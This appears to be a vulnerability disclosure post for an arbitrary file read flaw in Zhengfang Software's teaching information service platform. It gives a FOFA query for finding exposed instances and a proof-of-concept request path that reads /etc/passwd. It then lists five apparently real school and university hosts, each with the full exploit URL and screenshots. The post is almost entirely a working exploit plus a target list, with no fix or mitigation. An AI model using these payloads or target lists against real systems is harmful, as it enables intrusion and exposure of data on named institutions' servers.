# There is an arbitrary file reading vulnerability in the comprehensive teaching information service platform of Zhengfang Software Co., Ltd.



fofa：title="教学综合信息服务平台" && body="正方软件股份有限公司" && body="版本V-8.0.0"

poc：/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true



Exp1：

https://iteach.sjzlg.com/

![image-20240313175659778](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313175659778.png)

https://iteach.sjzlg.com/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true

![image-20240313175552385](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313175552385.png)



Exp2：

https://xjwxt.sxpi.edu.cn/

![image-20240313175736176](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313175736176.png)

https://xjwxt.sxpi.edu.cn/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true

![image-20240313175635121](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313175635121.png)

Exp3：

http://jw.lywhxy.com:8800/

![image-20240313175850542](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313175850542.png)

http://jw.lywhxy.com:8800/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true

![image-20240313175901632](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313175901632.png)





Exp4：

https://jwgl.xynun.edu.cn/

![image-20240313180022424](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313180022424.png)

https://jwgl.xynun.edu.cn/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true

![image-20240313180010534](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313180010534.png)





Exp5：

https://zfjw.sjzlg.com/

![image-20240313180119205](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313180119205.png)

https://zfjw.sjzlg.com/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true

![image-20240313180133138](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240313180133138.png)









































